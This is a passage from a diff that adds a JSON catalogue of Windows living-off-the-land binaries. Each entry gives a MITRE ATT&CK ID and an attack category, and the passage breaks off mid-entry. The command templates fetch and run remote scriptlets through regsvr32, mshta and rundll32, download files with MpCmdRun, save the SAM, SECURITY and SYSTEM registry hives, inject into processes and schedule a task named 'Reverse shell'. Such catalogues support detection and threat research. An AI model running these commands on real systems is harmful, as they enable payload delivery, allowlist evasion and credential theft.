+      "binary": "Ieframe.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}"
+    },
+    {
+      "binary": "Ilasm.exe",
+      "category": "Compile",
+      "mitre": "T1127",
+      "command": "ilasm.exe {PATH_ABSOLUTE:.txt} /dll"
+    },
+    {
+      "binary": "Ilasm.exe",
+      "category": "Compile",
+      "mitre": "T1127",
+      "command": "ilasm.exe {PATH_ABSOLUTE:.txt} /exe"
+    },
+    {
+      "binary": "Infdefaultinstall.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "InfDefaultInstall.exe {PATH:.inf}"
+    },
+    {
+      "binary": "Installutil.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218.004",
+      "command": "InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}"
+    },
+    {
+      "binary": "Installutil.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "InstallUtil.exe {REMOTEURL}"
+    },
+    {
+      "binary": "Installutil.exe",
+      "category": "Execute",
+      "mitre": "T1218.004",
+      "command": "InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}"
+    },
+    {
+      "binary": "IntelliTrace.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "IntelliTrace.exe launch /cp:\"collectionplan.xml\" /f:\"c:\\users\\public\\log\" \"C:\\Windows\\System32\\calc.exe\""
+    },
+    {
+      "binary": "Jsc.exe",
+      "category": "Compile",
+      "mitre": "T1127",
+      "command": "jsc.exe /t:library {PATH:.js}"
+    },
+    {
+      "binary": "Jsc.exe",
+      "category": "Compile",
+      "mitre": "T1127",
+      "command": "jsc.exe {PATH:.js}"
+    },
+    {
+      "binary": "Launch-VsDevShell.ps1",
+      "category": "Execute",
+      "mitre": "T1216",
+      "command": "powershell -ep RemoteSigned -f .\\Launch-VsDevShell.ps1 -VsInstallationPath \"/../../../../../; {PATH:.exe} ;\""
+    },
+    {
+      "binary": "Launch-VsDevShell.ps1",
+      "category": "Execute",
+      "mitre": "T1216",
+      "command": "powershell -ep RemoteSigned -f .\\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe}"
+    },
+    {
+      "binary": "Ldifde.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "Ldifde -i -f {PATH:.ldf}"
+    },
+    {
+      "binary": "Logger.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "logger.exe \"{CMD}\""
+    },
+    {
+      "binary": "Logger.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "logger.exe RUN \"{CMD}\""
+    },
+    {
+      "binary": "Logger.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "logger.exe RUNW \"{CMD}\""
+    },
+    {
+      "binary": "MSAccess.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "MSAccess.exe {REMOTEURL}"
+    },
+    {
+      "binary": "Makecab.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab"
+    },
+    {
+      "binary": "Makecab.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab"
+    },
+    {
+      "binary": "Makecab.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}"
+    },
+    {
+      "binary": "Makecab.exe",
+      "category": "Execute",
+      "mitre": "T1036",
+      "command": "makecab /F {PATH:.ddf}"
+    },
+    {
+      "binary": "Manage-bde.wsf",
+      "category": "Execute",
+      "mitre": "T1216",
+      "command": "copy c:\\users\\person\\evil.exe c:\\users\\public\\manage-bde.exe & cd c:\\users\\public\\ & cscript.exe c:\\windows\\system32\\manage-bde.wsf"
+    },
+    {
+      "binary": "Manage-bde.wsf",
+      "category": "Execute",
+      "mitre": "T1216",
+      "command": "set comspec={PATH_ABSOLUTE:.exe} & cscript c:\\windows\\system32\\manage-bde.wsf"
+    },
+    {
+      "binary": "Mavinject.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll"
+    },
+    {
+      "binary": "Mavinject.exe",
+      "category": "Execute",
+      "mitre": "T1218.013",
+      "command": "MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll}"
+    },
+    {
+      "binary": "Mftrace.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "Mftrace.exe {PATH:.exe}"
+    },
+    {
+      "binary": "Microsoft.NodejsTools.PressAnyKey.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe}"
+    },
+    {
+      "binary": "Microsoft.Workflow.Compiler.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1127",
+      "command": "Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}"
+    },
+    {
+      "binary": "Microsoft.Workflow.Compiler.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}"
+    },
+    {
+      "binary": "Microsoft.Workflow.Compiler.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}"
+    },
+    {
+      "binary": "Mmc.exe",
+      "category": "Download",
+      "mitre": "T1218.014",
+      "command": "mmc.exe -Embedding {PATH_ABSOLUTE:.msc}"
+    },
+    {
+      "binary": "Mmc.exe",
+      "category": "Execute",
+      "mitre": "T1218.014",
+      "command": "mmc.exe -Embedding {PATH_ABSOLUTE:.msc}"
+    },
+    {
+      "binary": "Mmc.exe",
+      "category": "UAC Bypass",
+      "mitre": "T1218.014",
+      "command": "mmc.exe gpedit.msc"
+    },
+    {
+      "binary": "MpCmdRun.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe"
+    },
+    {
+      "binary": "MpCmdRun.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}"
+    },
+    {
+      "binary": "MpCmdRun.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "copy \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" C:\\Users\\Public\\Downloads\\MP.exe && chdir \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\\" && \"C:\\Users\\Public\\Downloads\\MP.exe\" -DownloadFile -url {REMOTEURL:.exe} -path C:\\Users\\Public\\Downloads\\evil.exe"
+    },
+    {
+      "binary": "Mpiexec.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "mpiexec.exe {CMD}"
+    },
+    {
+      "binary": "Msbuild.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1127.001",
+      "command": "msbuild.exe {PATH:.xml}"
+    },
+    {
+      "binary": "Msbuild.exe",
+      "category": "Execute",
+      "mitre": "T1127.001",
+      "command": "msbuild.exe /logger:TargetLogger,{PATH_ABSOLUTE:.dll};MyParameters,Foo"
+    },
+    {
+      "binary": "Msbuild.exe",
+      "category": "Execute",
+      "mitre": "T1036",
+      "command": "msbuild.exe @{PATH:.rsp}"
+    },
+    {
+      "binary": "Msbuild.exe",
+      "category": "Execute",
+      "mitre": "T1127.001",
+      "command": "msbuild.exe {PATH:.csproj}"
+    },
+    {
+      "binary": "Msbuild.exe",
+      "category": "Execute",
+      "mitre": "T1127.001",
+      "command": "msbuild.exe {PATH:.proj}"
+    },
+    {
+      "binary": "Msconfig.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "Msconfig.exe -5"
+    },
+    {
+      "binary": "Mscopilot.exe",
+      "category": "Execute",
+      "mitre": "T1218.015",
+      "command": "mscopilot.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher=\"{CMD} && taskkill /f /im mscopilot.exe &&\""
+    },
+    {
+      "binary": "Mscopilot_proxy.exe",
+      "category": "Execute",
+      "mitre": "T1218.015",
+      "command": "mscopilot_proxy.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher=\"cmd.exe /c calc.exe && taskkill /f /im mscopilot.exe &&\""
+    },
+    {
+      "binary": "Msdeploy.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218",
+      "command": "msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=\"{PATH_ABSOLUTE:.bat}\""
+    },
+    {
+      "binary": "Msdeploy.exe",
+      "category": "Copy",
+      "mitre": "T1105",
+      "command": "msdeploy.exe -verb:sync -source:filePath={PATH_ABSOLUTE:.source.ext} -dest:filePath={PATH_ABSOLUTE:.dest.ext}"
+    },
+    {
+      "binary": "Msdeploy.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=\"{PATH_ABSOLUTE:.bat}\""
+    },
+    {
+      "binary": "Msdt.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218",
+      "command": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE"
+    },
+    {
+      "binary": "Msdt.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1202",
+      "command": "msdt.exe /id PCWDiagnostic /skip force /param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe\""
+    },
+    {
+      "binary": "Msdt.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE"
+    },
+    {
+      "binary": "Msedge.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "msedge.exe --headless --enable-logging --disable-gpu --dump-dom \"{REMOTEURL:.base64.html}\" > {PATH:.b64}"
+    },
+    {
+      "binary": "Msedge.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "msedge.exe {REMOTEURL:.exe.txt}"
+    },
+    {
+      "binary": "Msedge.exe",
+      "category": "Execute",
+      "mitre": "T1218.015",
+      "command": "msedge.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\""
+    },
+    {
+      "binary": "Mshta.exe",
+      "category": "ADS",
+      "mitre": "T1218.005",
+      "command": "mshta.exe \"{PATH_ABSOLUTE}:file.hta\""
+    },
+    {
+      "binary": "Mshta.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "mshta.exe {REMOTEURL}"
+    },
+    {
+      "binary": "Mshta.exe",
+      "category": "Execute",
+      "mitre": "T1218.005",
+      "command": "mshta.exe javascript:a=GetObject(\"script:{REMOTEURL:.sct}\").Exec();close();"
+    },
+    {
+      "binary": "Mshta.exe",
+      "category": "Execute",
+      "mitre": "T1218.005",
+      "command": "mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:{REMOTEURL:.sct}\"\")\"))"
+    },
+    {
+      "binary": "Mshta.exe",
+      "category": "Execute",
+      "mitre": "T1218.005",
+      "command": "mshta.exe {PATH:.hta}"
+    },
+    {
+      "binary": "Mshtml.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}"
+    },
+    {
+      "binary": "Msiexec.exe",
+      "category": "Execute",
+      "mitre": "T1218.007",
+      "command": "msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS=\"{REMOTEURL:.mst}\" /qb"
+    },
+    {
+      "binary": "Msiexec.exe",
+      "category": "Execute",
+      "mitre": "T1218.007",
+      "command": "msiexec /q /i {REMOTEURL}"
+    },
+    {
+      "binary": "Msiexec.exe",
+      "category": "Execute",
+      "mitre": "T1218.007",
+      "command": "msiexec /quiet /i {PATH:.msi}"
+    },
+    {
+      "binary": "Msiexec.exe",
+      "category": "Execute",
+      "mitre": "T1218.007",
+      "command": "msiexec /y {PATH_ABSOLUTE:.dll}"
+    },
+    {
+      "binary": "Msiexec.exe",
+      "category": "Execute",
+      "mitre": "T1218.007",
+      "command": "msiexec /z {PATH_ABSOLUTE:.dll}"
+    },
+    {
+      "binary": "MsoHtmEd.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "MsoHtmEd.exe {REMOTEURL}"
+    },
+    {
+      "binary": "Mspub.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "mspub.exe {REMOTEURL}"
+    },
+    {
+      "binary": "Netsh.exe",
+      "category": "Execute",
+      "mitre": "T1546.007",
+      "command": "netsh.exe add helper {PATH_ABSOLUTE:.dll}"
+    },
+    {
+      "binary": "Ngen.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "ngen.exe {REMOTEURL}"
+    },
+    {
+      "binary": "Nmcap.exe",
+      "category": "Reconnaissance",
+      "mitre": "T1040",
+      "command": "nmcap.exe /network * /capture /file {PATH_ABSOLUTE:.cap}"
+    },
+    {
+      "binary": "Ntsd.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "ntsd.exe -g {CMD}"
+    },
+    {
+      "binary": "Odbcconf.exe",
+      "category": "Execute",
+      "mitre": "T1218.008",
+      "command": "odbcconf -f {PATH:.rsp}"
+    },
+    {
+      "binary": "Odbcconf.exe",
+      "category": "Execute",
+      "mitre": "T1218.008",
+      "command": "odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}}"
+    },
+    {
+      "binary": "Odbcconf.exe",
+      "category": "Execute",
+      "mitre": "T1218.008",
+      "command": "odbcconf INSTALLDRIVER \"lolbas-project|Driver={PATH_ABSOLUTE:.dll}|APILevel=2\"\nodbcconf configsysdsn \"lolbas-project\" \"DSN=lolbas-project\"\n"
+    },
+    {
+      "binary": "OfflineScannerShell.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "OfflineScannerShell"
+    },
+    {
+      "binary": "OneDriveStandaloneUpdater.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "OneDriveStandaloneUpdater"
+    },
+    {
+      "binary": "OpenConsole.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "OpenConsole.exe {PATH:.exe}"
+    },
+    {
+      "binary": "Outlook.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "Outlook.exe {REMOTEURL}"
+    },
+    {
+      "binary": "Pcalua.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "pcalua.exe -a {PATH:.exe}"
+    },
+    {
+      "binary": "Pcalua.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java"
+    },
+    {
+      "binary": "Pcalua.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "pcalua.exe -a {PATH_SMB:.dll}"
+    },
+    {
+      "binary": "Pcwrun.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "Pcwrun.exe /../../$(calc).exe"
+    },
+    {
+      "binary": "Pcwrun.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "Pcwrun.exe {PATH_ABSOLUTE:.exe}"
+    },
+    {
+      "binary": "Pcwutl.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}"
+    },
+    {
+      "binary": "Pester.bat",
+      "category": "Execute",
+      "mitre": "T1216",
+      "command": "Pester.bat ;{PATH:.exe}"
+    },
+    {
+      "binary": "Pester.bat",
+      "category": "Execute",
+      "mitre": "T1216",
+      "command": "Pester.bat [/help|?|-?|/?] \"$null; {CMD}\""
+    },
+    {
+      "binary": "PhotoViewer.dll",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "rundll32.exe \"C:\\Program Files\\Windows Photo Viewer\\PhotoViewer.dll\",ImageView_Fullscreen {REMOTEURL}"
+    },
+    {
+      "binary": "Pixtool.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "pixtool.exe launch {PATH_ABSOLUTE:.exe}"
+    },
+    {
+      "binary": "Pktmon.exe",
+      "category": "Reconnaissance",
+      "mitre": "T1040",
+      "command": "pktmon.exe filter add -p 445"
+    },
+    {
+      "binary": "Pktmon.exe",
+      "category": "Reconnaissance",
+      "mitre": "T1040",
+      "command": "pktmon.exe start --etw"
+    },
+    {
+      "binary": "Pnputil.exe",
+      "category": "Execute",
+      "mitre": "T1547",
+      "command": "pnputil.exe -i -a {PATH_ABSOLUTE:.inf}"
+    },
+    {
+      "binary": "Powerpnt.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "Powerpnt.exe {REMOTEURL}"
+    },
+    {
+      "binary": "Powershell.exe",
+      "category": "Execute",
+      "mitre": "T1059.001",
+      "command": "powershell.exe -ep bypass -command \"Invoke-AllTheThings...\""
+    },
+    {
+      "binary": "Powershell.exe",
+      "category": "Execute",
+      "mitre": "T1059.001",
+      "command": "powershell.exe -ep bypass -ec IgBXAGUAIAA8ADMAIABMAE8ATABCAEEAUwAiAA=="
+    },
+    {
+      "binary": "Powershell.exe",
+      "category": "Execute",
+      "mitre": "T1059.001",
+      "command": "powershell.exe -ep bypass -file c:\\path\\to\\a\\script.ps1"
+    },
+    {
+      "binary": "Presentationhost.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "Presentationhost.exe {REMOTEURL}"
+    },
+    {
+      "binary": "Presentationhost.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "Presentationhost.exe {PATH_ABSOLUTE:.xbap}"
+    },
+    {
+      "binary": "Print.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}"
+    },
+    {
+      "binary": "Print.exe",
+      "category": "Copy",
+      "mitre": "T1105",
+      "command": "print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}"
+    },
+    {
+      "binary": "Print.exe",
+      "category": "Copy",
+      "mitre": "T1105",
+      "command": "print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}"
+    },
+    {
+      "binary": "PrintBrm.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder}"
+    },
+    {
+      "binary": "PrintBrm.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}"
+    },
+    {
+      "binary": "Procdump.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "procdump.exe -md {PATH:.dll} explorer.exe"
+    },
+    {
+      "binary": "Procdump.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "procdump.exe -md {PATH:.dll} foobar"
+    },
+    {
+      "binary": "ProtocolHandler.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "ProtocolHandler.exe {REMOTEURL}"
+    },
+    {
+      "binary": "Provlaunch.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "provlaunch.exe LOLBin"
+    },
+    {
+      "binary": "Psr.exe",
+      "category": "Reconnaissance",
+      "mitre": "T1113",
+      "command": "psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0"
+    },
+    {
+      "binary": "Pubprn.vbs",
+      "category": "Execute",
+      "mitre": "T1216.001",
+      "command": "pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}"
+    },
+    {
+      "binary": "Query.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "query.exe user"
+    },
+    {
+      "binary": "Rasautou.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "rasautou -d {PATH:.dll} -p export_name -a a -e e"
+    },
+    {
+      "binary": "Reg.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg {PATH_ABSOLUTE}:evilreg.reg"
+    },
+    {
+      "binary": "Reg.exe",
+      "category": "Credentials",
+      "mitre": "T1003.002",
+      "command": "reg save HKLM\\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\\SAM {PATH_ABSOLUTE:.3.bak}"
+    },
+    {
+      "binary": "Regasm.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218.009",
+      "command": "regasm.exe {PATH:.dll}"
+    },
+    {
+      "binary": "Regasm.exe",
+      "category": "Execute",
+      "mitre": "T1218.009",
+      "command": "regasm.exe /U {PATH:.dll}"
+    },
+    {
+      "binary": "Regedit.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey"
+    },
+    {
+      "binary": "Regedit.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "regedit {PATH_ABSOLUTE}:regfile.reg"
+    },
+    {
+      "binary": "Regini.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "regini.exe {PATH}:hidden.ini"
+    },
+    {
+      "binary": "Register-cimprovider.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "Register-cimprovider -path {PATH_ABSOLUTE:.dll}"
+    },
+    {
+      "binary": "Regsvcs.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218.009",
+      "command": "regsvcs.exe {PATH:.dll}"
+    },
+    {
+      "binary": "Regsvcs.exe",
+      "category": "Execute",
+      "mitre": "T1218.009",
+      "command": "regsvcs.exe {PATH:.dll}"
+    },
+    {
+      "binary": "Regsvr32.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218.010",
+      "command": "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll"
+    },
+    {
+      "binary": "Regsvr32.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1218.010",
+      "command": "regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll"
+    },
+    {
+      "binary": "Regsvr32.exe",
+      "category": "Execute",
+      "mitre": "T1218.010",
+      "command": "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll"
+    },
+    {
+      "binary": "Regsvr32.exe",
+      "category": "Execute",
+      "mitre": "T1218.010",
+      "command": "regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll"
+    },
+    {
+      "binary": "Regsvr32.exe",
+      "category": "Execute",
+      "mitre": "T1218.010",
+      "command": "regsvr32.exe /s {PATH:.dll}"
+    },
+    {
+      "binary": "Regsvr32.exe",
+      "category": "Execute",
+      "mitre": "T1218.010",
+      "command": "regsvr32.exe /u /s {PATH:.dll}"
+    },
+    {
+      "binary": "Remote.exe",
+      "category": "AWL Bypass",
+      "mitre": "T1127",
+      "command": "Remote.exe /s {PATH:.exe} anythinghere"
+    },
+    {
+      "binary": "Remote.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "Remote.exe /s {PATH:.exe} anythinghere"
+    },
+    {
+      "binary": "Remote.exe",
+      "category": "Execute",
+      "mitre": "T1127",
+      "command": "Remote.exe /s {PATH_SMB:.exe} anythinghere"
+    },
+    {
+      "binary": "Replace.exe",
+      "category": "Copy",
+      "mitre": "T1105",
+      "command": "replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A"
+    },
+    {
+      "binary": "Replace.exe",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A"
+    },
+    {
+      "binary": "Reset.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "reset.exe session"
+    },
+    {
+      "binary": "Rpcping.exe",
+      "category": "Credentials",
+      "mitre": "T1003",
+      "command": "rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM"
+    },
+    {
+      "binary": "Rpcping.exe",
+      "category": "Credentials",
+      "mitre": "T1187",
+      "command": "rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM"
+    },
+    {
+      "binary": "Rundll32.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "rundll32 \"{PATH}:ADSDLL.dll\",DllMain"
+    },
+    {
+      "binary": "Rundll32.exe",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe -sta {CLSID}"
+    },
+    {
+      "binary": "Rundll32.exe",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:{REMOTEURL}\")"
+    },
+    {
+      "binary": "Rundll32.exe",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe {PATH_SMB:.dll},EntryPoint"
+    },
+    {
+      "binary": "Rundll32.exe",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe {PATH},EntryPoint"
+    },
+    {
+      "binary": "Runexehelper.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "runexehelper.exe {PATH_ABSOLUTE:.exe}"
+    },
+    {
+      "binary": "Runonce.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "Runonce.exe /AlternateShellStartup"
+    },
+    {
+      "binary": "Runscripthelper.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "runscripthelper.exe surfacecheck \\\\?\\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder}"
+    },
+    {
+      "binary": "SQLToolsPS.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe}"
+    },
+    {
+      "binary": "Sc.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "sc config {ExistingServiceName} binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" & sc start {ExistingServiceName}"
+    },
+    {
+      "binary": "Sc.exe",
+      "category": "ADS",
+      "mitre": "T1564.004",
+      "command": "sc create evilservice binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" DisplayName= \"evilservice\" start= auto\\ & sc start evilservice"
+    },
+    {
+      "binary": "Schtasks.exe",
+      "category": "Execute",
+      "mitre": "T1053.005",
+      "command": "schtasks /create /s targetmachine /tn \"MyTask\" /tr \"{CMD}\" /sc daily"
+    },
+    {
+      "binary": "Schtasks.exe",
+      "category": "Execute",
+      "mitre": "T1053.005",
+      "command": "schtasks /create /sc minute /mo 1 /tn \"Reverse shell\" /tr \"{CMD}\""
+    },
+    {
+      "binary": "Scriptrunner.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "ScriptRunner.exe -appvscript {PATH_SMB:.cmd}"
+    },
+    {
+      "binary": "Scriptrunner.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "Scriptrunner.exe -appvscript {PATH:.exe}"
+    },
+    {
+      "binary": "Scrobj.dll",
+      "category": "Download",
+      "mitre": "T1105",
+      "command": "rundll32.exe C:\\Windows\\System32\\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}"
+    },
+    {
+      "binary": "Setres.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "setres.exe -w 800 -h 600"
+    },
+    {
+      "binary": "SettingSyncHost.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "SettingSyncHost -LoadAndRunDiagScript {PATH:.exe}"
+    },
+    {
+      "binary": "SettingSyncHost.exe",
+      "category": "Execute",
+      "mitre": "T1218",
+      "command": "SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat}"
+    },
+    {
+      "binary": "Setupapi.dll",
+      "category": "AWL Bypass",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}"
+    },
+    {
+      "binary": "Setupapi.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}"
+    },
+    {
+      "binary": "Sftp.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "sftp -D \"{CMD}\""
+    },
+    {
+      "binary": "Sftp.exe",
+      "category": "Execute",
+      "mitre": "T1202",
+      "command": "sftp -o ProxyCommand=\"{CMD}\" ."
+    },
+    {
+      "binary": "Shdocvw.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe shdocvw.dll,OpenURL {PATH_ABSOLUTE:.url}"
+    },
+    {
+      "binary": "Shell32.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}"
+    },
+    {
+      "binary": "Shell32.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe shell32.dll,#44 {PATH:.dll}"
+    },
+    {
+      "binary": "Shell32.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}"
+    },
+    {
+      "binary": "Shell32.dll",
+      "category": "Execute",
+      "mitre": "T1218.011",
+      "command": "rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}"
+    },
+    {
+      "binary": "Shimgvw.dll",
+      "category": "Download",
